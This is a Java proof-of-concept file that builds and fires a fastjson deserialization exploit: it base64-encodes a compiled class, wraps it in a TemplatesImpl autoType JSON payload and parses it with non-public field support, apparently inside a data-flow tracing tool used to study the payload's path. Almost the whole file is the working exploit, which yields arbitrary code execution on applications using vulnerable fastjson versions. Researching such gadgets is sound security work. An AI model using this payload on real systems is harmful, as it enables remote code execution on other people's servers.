package com.wsh.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.dataflow.TraceContext;
import com.dataflow.model.TraceFlowReport;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public class TestPoc {
    public static void main(String[] args) throws IOException {
        byte[] bytecodes = Files.readAllBytes(Paths.get("/Users/admin/Desktop/Java/src/main/java/Calc_.class"));

        String base64Bytecodes = java.util.Base64.getEncoder().encodeToString(bytecodes);

        String payload = String.format(
                "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"," +
                        "\"_name\":\"Calc_\"," +
                        "\"_tfactory\":{ }," +
                        "\"_bytecodes\":[\"%s\"],"+"\"_outputProperties\":{ }"+"}", base64Bytecodes);
        System.out.println("payload as follow:\n" + payload);
//        JSON.parse(payload, Feature.SupportNonPublicField);
        TraceFlowReport report = TraceContext.trace("payload", base64Bytecodes, () -> {
            try {
                JSON.parse(payload, Feature.SupportNonPublicField);
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        });
        System.out.println(report.toTreeString());


    }
}
